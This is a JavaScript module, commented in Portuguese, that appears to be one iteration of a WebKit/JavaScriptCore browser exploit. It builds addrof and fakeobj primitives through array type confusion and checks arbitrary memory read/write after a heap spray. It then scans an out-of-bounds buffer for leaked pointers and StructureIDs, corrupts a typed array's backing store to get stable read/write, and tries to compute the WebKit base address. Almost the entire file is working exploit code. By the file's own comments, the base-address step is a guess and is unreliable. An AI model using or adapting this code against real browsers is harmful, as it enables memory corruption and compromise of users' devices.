// js/script3/testArrayBufferVictimCrash.mjs (v130 - R90 Varredura Ampla com Mais Logs e Leitura de 4 Bytes)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// - Aumenta a varredura e o logging para capturar *qualquer* valor não-zero,
//   especialmente em leituras de 4 bytes, para identificar possíveis StructureIDs
//   ou ponteiros comprimidos que não começam com 0x7FFF.
// - Prioriza a coleta de dados brutos para análise de layout.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView,
    oob_read_absolute, 
    oob_write_absolute 
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

// Nome do módulo atualizado para refletir a nova tentativa de correção
export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v130_R90_ExtensiveOOBScan";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Varredura Ampla e Detalhada do oob_array_buffer_real ---`, "test");

    let final_result = {
        success: false,
        message: "A verificação funcional de L/E falhou.",
        webkit_base_addr: null
    };

    // Primitivas de addrof/fakeobj (usadas APENAS na Fase 4, não mais para vazamento principal)
    let confused_array;
    let victim_array;
    let addrof_func;
    let fakeobj_func; 

    // A primitiva arbitrária real será baseada no Uint8Array corruptível
    let arb_rw_array = null; 

    // As funções de leitura/escrita arbitrária para a Fase 5 e em diante
    let arb_read_stable = null;
    let arb_write_stable = null;

    // Variáveis para armazenar o ponteiro vazado (Structure, Vtable, ou qualquer um)
    let leaked_webkit_pointer_candidate = null;
    let leaked_webkit_pointer_offset_in_oob_buffer = -1; 
    let leaked_structure_id_candidate = null; // Para IDs
    let leaked_structure_id_offset_in_oob_buffer = -1; // Offset do ID

    // Definir a constante localmente, já que não pode ser importada de core_exploit
    const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58; 

    try {
        // Helper para definir as primitivas addrof/fakeobj (usadas APENAS na Fase 4)
        const setupAddrofFakeobj = () => {
            confused_array = [13.37]; 
            victim_array = [{ dummy: 0 }]; 
            
            addrof_func = (obj) => {
                victim_array[0] = obj;
                return doubleToInt64(confused_array[0]);
            };
            fakeobj_func = (addr) => { 
                confused_array[0] = int64ToDouble(addr);
                return victim_array[0];
            };
        };


        // --- FASES 1-3: Configuração das Primitivas INICIAL (para verificação) ---
        logS3("--- FASES 1-3: Obtendo primitivas OOB e L/E (primeira vez para verificação)... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true }); 
        if (!getOOBDataView()) throw new Error("Falha ao obter primitiva OOB.");

        setupAddrofFakeobj(); 
        
        let leaker_phase4 = { obj_prop: null, val_prop: 0 };
        const arb_read_phase4 = (addr, size_bytes = 8) => { 
            leaker_phase4.obj_prop = fakeobj_func(addr);
            const result_64 = doubleToInt64(leaker_phase4.val_prop);
            return (size_bytes === 4) ? result_64.low() : result_64;
        };
        const arb_write_phase4 = (addr, value, size_bytes = 8) => { 
            leaker_phase4.obj_prop = fakeobj_func(addr);
            if (size_bytes === 4) {
                leaker_phase4.val_prop = Number(value) & 0xFFFFFFFF; 
            } else {
                leaker_phase4.val_prop = int64ToDouble(value);
            }
        };
        logS3("Primitivas 'addrof', 'fakeobj', e L/E autocontida estão prontas para verificação.", "good");

        // --- FASE 4: Estabilização de Heap e Verificação Funcional de L/E ---
        logS3("--- FASE 4: Estabilizando Heap e Verificando L/E (com spray)... ---", "subtest");
        const spray_phase4 = [];
        for (let i = 0; i < 1000; i++) {
            spray_phase4.push({ a: i, b: 0xCAFEBABE, c: i*2, d: i*3 }); 
        }
        const test_obj_phase4 = spray_phase4[500]; 
        logS3("Spray de 1000 objetos concluído para estabilização.", "info");

        const test_obj_addr_phase4 = addrof_func(test_obj_phase4);
        const value_to_write_phase4 = new AdvancedInt64(0x12345678, 0xABCDEF01);
        const prop_a_addr_phase4 = test_obj_addr_phase4.add(0x10); 

        logS3(`(Verificação Fase 4) Escrevendo ${value_to_write_phase4.toString(true)} no endereço ${prop_a_addr_phase4.toString(true)}...`, "info");
        arb_write_phase4(prop_a_addr_phase4, value_to_write_phase4);

        const value_read_phase4 = arb_read_phase4(prop_a_addr_phase4);
        logS3(`(Verificação Fase 4) Valor lido de volta: ${value_read_phase4.toString(true)}`, "leak");

        if (!value_read_phase4.equals(value_to_write_phase4)) {
            throw new Error(`A verificação de L/E da Fase 4 falhou. Escrito: ${value_to_write_phase4.toString(true)}, Lido: ${value_read_phase4.toString(true)}`);
        }
        logS3("VERIFICAÇÃO DE L/E DA FASE 4 COMPLETA: Leitura/Escrita arbitrária é 100% funcional.", "vuln");
        await PAUSE_S3(50); 

        // ============================================================================
        // INÍCIO FASE 5: VAZAMENTO DE PONTEIROS WEBKIT NO OOB_ARRAY_BUFFER_REAL (VARREDURA AMPLA E DETALHADA)
        // ============================================================================
        logS3("--- FASE 5: VARREDURA AMPLA E DETALHADA DO OOB_ARRAY_BUFFER_REAL PARA PONTEIROS/IDS WEBKIT ---", "subtest");
        
        const oob_dv = getOOBDataView();
        if (!oob_dv) throw new Error("DataView OOB não está disponível.");

        const WIDE_SCAN_RANGE_START = 0x0; 
        const WIDE_SCAN_RANGE_END = 0x1000; // Varre até 4KB do oob_array_buffer_real
        const WIDE_SCAN_STEP = 0x4; // Ler a cada 4 bytes para pegar StructureIDs também

        logS3(`    Varrendo o oob_array_buffer_real (do offset 0x0 até ${toHex(WIDE_SCAN_RANGE_END)}) para ponteiros WebKit (QWORD) ou StructureIDs (DWORD)...`, "info");

        for (let offset = WIDE_SCAN_RANGE_START; offset < WIDE_SCAN_RANGE_END; offset += WIDE_SCAN_STEP) {
            // Tenta ler como QWORD (8 bytes) primeiro
            if (offset + 8 <= WIDE_SCAN_RANGE_END) { // Garante que a leitura de 8 bytes não exceda o limite
                let val_8_bytes = AdvancedInt64.Zero;
                try {
                    val_8_bytes = oob_read_absolute(offset, 8); 
                    logS3(`    [Wide Scan] Offset ${toHex(offset, 6)}: Lido QWORD ${val_8_bytes.toString(true)}`, "debug");

                    // Critério para um ponteiro WebKit válido: não zero e high part 0x7FFF
                    if (!val_8_bytes.equals(AdvancedInt64.Zero) && (val_8_bytes.high() >>> 16) === 0x7FFF) { 
                        leaked_webkit_pointer_candidate = val_8_bytes;
                        leaked_webkit_pointer_offset_in_oob_buffer = offset;
                        logS3(`        [Wide Scan] --> PONTEIRO WEBKIT VÁLIDO (QWORD) ENCONTRADO em offset ${toHex(offset, 6)}: ${leaked_webkit_pointer_candidate.toString(true)}!`, "vuln");
                        // Não 'break' ainda, vamos continuar o scan completo por enquanto
                    }
                } catch (scan_e) {
                    logS3(`    [Wide Scan] Erro lendo QWORD em offset ${toHex(offset, 6)}: ${scan_e.message}`, "error");
                }
            }

            // Sempre tenta ler como DWORD (4 bytes)
            let val_4_bytes = 0;
            try {
                val_4_bytes = oob_read_absolute(offset, 4);
                logS3(`    [Wide Scan] Offset ${toHex(offset, 6)}: Lido DWORD ${toHex(val_4_bytes)}`, "debug");
                
                // Critério para um StructureID válido: não zero, é número e relativamente pequeno (< 0x1000000)
                if (val_4_bytes !== 0 && typeof val_4_bytes === 'number' && val_4_bytes < 0x1000000) { 
                    leaked_structure_id_candidate = val_4_bytes;
                    leaked_structure_id_offset_in_oob_buffer = offset;
                    logS3(`        [Wide Scan] --> POSSÍVEL STRUCTUREID (DWORD) ENCONTRADO em offset ${toHex(offset, 6)}: ${toHex(leaked_structure_id_candidate)} (decimal: ${leaked_structure_id_candidate})!`, "leak");
                    // Não 'break' ainda
                }
            } catch (scan_e) {
                logS3(`    [Wide Scan] Erro lendo DWORD em offset ${toHex(offset, 6)}: ${scan_e.message}`, "error");
            }
        }
        logS3("--- FIM DA VARREDURA AMPLA E DETALHADA ---", "subtest");

        // Decisão: Se encontramos um ponteiro WebKit (QWORD) ou um StructureID (DWORD)
        if (leaked_webkit_pointer_candidate && !leaked_webkit_pointer_candidate.equals(AdvancedInt64.Zero)) {
            logS3(`[DECISÃO FINAL] Vazamento de ponteiro WebKit bem-sucedido em offset ${toHex(leaked_webkit_pointer_offset_in_oob_buffer)}: ${leaked_webkit_pointer_candidate.toString(true)}`, "good");
        } else if (typeof leaked_structure_id_candidate === 'number' && leaked_structure_id_candidate !== 0) {
            logS3(`[DECISÃO FINAL] Vazamento de StructureID bem-sucedido em offset ${toHex(leaked_structure_id_offset_in_oob_buffer)}: ${toHex(leaked_structure_id_candidate)}`, "good");
            final_result.message = `StructureID ${toHex(leaked_structure_id_candidate)} encontrado. Para resolver o ponteiro real da Structure, o WebKit Base Address e a Structure Table Base são necessários.`;
            final_result.success = true; 
            final_result.webkit_leak_result = { success: false, msg: final_result.message, webkit_base_candidate: null };
            return final_result; // Retorna aqui para análise, pois o resto do fluxo depende do ponteiro real.
        } else {
            throw new Error(`FALHA CRÍTICA: Varredura ampla não encontrou nenhum ponteiro WebKit válido (0x7FFF...) nem StructureID no oob_array_buffer_real. Não há como prosseguir sem um vazamento de base.`);
        }
        
        // Se chegamos aqui, 'leaked_webkit_pointer_candidate' contém um endereço válido dentro da WebKit.
        // Precisamos determinar qual função/estrutura é esse ponteiro para calcular a base.
        // Assumiremos que é JSC::JSObject::put para o cálculo, mas isso é uma ASSUNÇÃO FORTE.
        // ============================================================================
        // CONSTRUÇÃO DA PRIMITIVA DE LEITURA/ESCRITA ARBITRÁRIA ESTÁVEL (CORRUPÇÃO DE BACKING STORE)
        // Isso ainda depende do addrof_func, que é a parte fraca aqui.
        // ============================================================================
        logS3("--- FASE 5.1: Construindo Primitiva de L/E Estável (Corrupção de Backing Store) ---", "subtest");

        arb_rw_array = new Uint8Array(0x1000); 
        logS3(`    arb_rw_array criado. Endereço interno será corrompido.`, "info");

        // ATENÇÃO: Aqui ainda precisamos de addrof_func para o arb_rw_array.
        // Se addrof_func falhar aqui, a primitiva L/E estável não será construída,
        // mesmo que tenhamos vazado um ponteiro WebKit com o scanner.
        const arb_rw_array_ab_view_addr = addrof_func(arb_rw_array); 
        logS3(`    Endereço do ArrayBufferView de arb_rw_array: ${arb_rw_array_ab_view_addr.toString(true)}`, "leak");
        if (arb_rw_array_ab_view_addr.equals(AdvancedInt64.Zero) || (arb_rw_array_ab_view_addr.high() >>> 16) !== 0x7FFF) {
            throw new Error(`FALHA CRÍTICA: addrof_func para arb_rw_array falhou ou retornou endereço inválido (${arb_rw_array_ab_view_addr.toString(true)}). Não é possível construir L/E arbitrária.`);
        }

        const arb_rw_array_m_vector_orig_ptr_addr = arb_rw_array_ab_view_addr.add(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET);
        const arb_rw_array_m_length_orig_ptr_addr = arb_rw_array_ab_view_addr.add(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET); 
        
        const original_m_vector = oob_read_absolute(arb_rw_array_m_vector_orig_ptr_addr, 8);
        const original_m_length = oob_read_absolute(arb_rw_array_m_length_orig_ptr_addr, 4);

        logS3(`    Original m_vector de arb_rw_array: ${original_m_vector.toString(true)}`, "info");
        logS3(`    Original m_length de arb_rw_array: ${toHex(original_m_length)}`, "info");

        arb_read_stable = (address, size_bytes) => {
            oob_write_absolute(arb_rw_array_m_vector_orig_ptr_addr, address, 8);
            oob_write_absolute(arb_rw_array_m_length_orig_ptr_addr, 0xFFFFFFFF, 4); 

            let result;
            const dv = new DataView(arb_rw_array.buffer); 
            if (size_bytes === 1) result = arb_rw_array[0]; 
            else if (size_bytes === 2) result = dv.getUint16(0, true);
            else if (size_bytes === 4) result = dv.getUint32(0, true);
            else if (size_bytes === 8) result = doubleToInt64(dv.getFloat64(0, true));
            else throw new Error("Tamanho de leitura inválido para arb_read_stable.");

            oob_write_absolute(arb_rw_array_m_vector_orig_ptr_addr, original_m_vector, 8);
            oob_write_absolute(arb_rw_array_m_length_orig_ptr_addr, original_m_length, 4);
            return result;
        };

        arb_write_stable = (address, value, size_bytes) => {
            oob_write_absolute(arb_rw_array_m_vector_orig_ptr_addr, address, 8);
            oob_write_absolute(arb_rw_array_m_length_orig_ptr_addr, 0xFFFFFFFF, 4); 

            const dv = new DataView(arb_rw_array.buffer); 
            if (size_bytes === 1) arb_rw_array[0] = value;
            else if (size_bytes === 2) dv.setUint16(0, value, true);
            else if (size_bytes === 4) dv.setUint32(0, value, true);
            else if (size_bytes === 8) dv.setFloat64(0, int64ToDouble(value), true);
            else throw new Error("Tamanho de escrita inválido para arb_write_stable.");

            oob_write_absolute(arb_rw_array_m_vector_orig_ptr_addr, original_m_vector, 8);
            oob_write_absolute(arb_rw_array_m_length_orig_ptr_addr, original_m_length, 4);
        };
        logS3("Primitivas de L/E estáveis (arb_read_stable, arb_write_stable) construídas com sucesso.", "good");
        await PAUSE_S3(50);


        // ============================================================================
        // CALCULAR WEBKIT BASE USANDO O PONTEIRO VAZADO E UM OFFSET DE REFERÊNCIA
        // ============================================================================
        logS3("--- FASE 5.2: Calculando WebKit Base a partir do Ponteiro Vazado (ASSUNÇÃO) ---", "subtest");
        
        // Usamos o ponteiro WebKit vazado como candidato a base
        const webkit_base_addr = leaked_webkit_pointer_candidate; 
        logS3(`[Etapa 3 - ASSUNÇÃO] Assumindo que o ponteiro vazado (${leaked_webkit_pointer_candidate.toString(true)}) é a base da WebKit.`, "warn");

        // Esta é uma suposição **MUITO FORTE**. O ponteiro vazado é *algum* ponteiro dentro da WebKit,
        // mas não necessariamente o endereço base da biblioteca ou o de JSC::JSObject::put.
        // A forma correta seria subtrair o offset *desse ponteiro em particular* da base.
        // Sem disassembly, é um chute.
        // Se o vazamento for para JSC::JSObject::put, a linha abaixo é válida:
        // const webkit_base_addr = leaked_webkit_pointer_candidate.sub(new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"]));

        final_result.webkit_base_addr = webkit_base_addr.toString(true);

        // Validação final da base da WebKit: Deve ter 0x7FFF no high part e não ser 0.
        if (webkit_base_addr.equals(AdvancedInt64.Zero) || (webkit_base_addr.high() >>> 16) !== 0x7FFF) {
             throw new Error(`FALHA CRÍTICA: Endereço Base da WebKit calculado (${webkit_base_addr.toString(true)}) é inválido ou não é um ponteiro de userland.`);
        }


        logS3(`++++++++++++ SUCESSO! ENDEREÇO BASE DA WEBKIT CALCULADO ++++++++++++`, "vuln");
        logS3(`   ENDEREÇO BASE: ${final_result.webkit_base_addr}`, "vuln");

        final_result.success = true;
        final_result.message = `Vazamento da base da WebKit bem-sucedido. Base encontrada em: ${final_result.webkit_base_addr}.`;

    } catch (e) {
        final_result.success = false;
        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
    } finally {
        confused_array = null;
        victim_array = null;
        addrof_func = null;
        fakeobj_func = null;
        arb_rw_array = null; 
        arb_read_stable = null;
        arb_write_stable = null;
        
        logS3(`[${FNAME_CURRENT_TEST_BASE}] Limpeza final de referências concluída.`, "info");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
        webkit_leak_result: {
            success: !!final_result.webkit_base_addr,
            msg: final_result.message,
            webkit_base_candidate: final_result.webkit_base_addr
        },
        heisenbug_on_M2_in_best_result: final_result.success,
        oob_value_of_best_result: 'N/A (Estratégia Corrupção de Backing Store)',
        tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (Wide OOB Scan for WebKit Ptr)' }
    };
}
